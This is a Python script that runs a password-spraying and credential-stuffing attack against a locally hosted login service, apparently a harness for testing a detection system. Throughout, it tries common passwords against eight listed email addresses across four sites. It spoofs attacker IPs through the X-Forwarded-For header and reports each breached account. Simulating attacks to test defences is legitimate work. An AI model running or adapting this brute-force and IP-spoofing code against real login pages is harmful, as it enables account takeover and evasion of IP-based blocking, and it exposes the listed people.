import requests
import time

BASE_URL = "http://127.0.0.1:5000"

# 8 Targeted Emails
targets = [
    'avdhi.jain@mitwpu.edu.in', 'ananya.p@yahoo.com', 'rahul.admin@mitwpu.edu.in',
    'suhani.student@mitwpu.edu.in', 'amit.dev@gmail.com', 'priya.s@outlook.com',
    'kabir.singh@gmail.com', 'ishita.r@yahoo.com'
]

# List of malicious IPs from your database to "spoof"
attacker_ips = ['123.45.10.242', '192.179.1.20', '189.134.242.11', '103.50.90.252']

# Common passwords to try
pass_list = ["123456", "admin", "welcome", "password123", "login@123"]

def run_distributed_attack():
    print("🚀 Initializing Distributed Botnet Attack...")
    
    for site_id in range(1, 5): # Iterate through all 4 sites
        current_ip = attacker_ips[site_id - 1] # Use a different IP for each site attack
        print(f"\n[SPOOFING IP: {current_ip}] Target Site: {site_id}")
        
        found_on_this_site = False
        
        for email in targets:
            if found_on_this_site: break # Stop site attack if we already breached one user
            
            for pwd in pass_list:
                print(f"  Testing {email} with password: {pwd}")
                
                # We send the fake IP in the headers
                headers = {'X-Forwarded-For': current_ip}
                
                try:
                    response = requests.post(
                        f"{BASE_URL}/login-process/{site_id}", 
                        data={'u_email': email, 'u_pass': pwd},
                        headers=headers
                    )
                    
                    # Check for successful login keywords
                    if any(word in response.text for word in ["Feed", "Dashboard", "Account", "Portal"]):
                        print(f"  ✅ SUCCESS! Breached {email}. Terminating attack on Site {site_id}.")
                        found_on_this_site = True
                        break # Found a working password, stop trying passwords for this user
                
                except Exception as e:
                    print(f"  ⚠️ Error: {e}")
                
                time.sleep(0.1) # Bot speed

if __name__ == "__main__":
    run_distributed_attack()
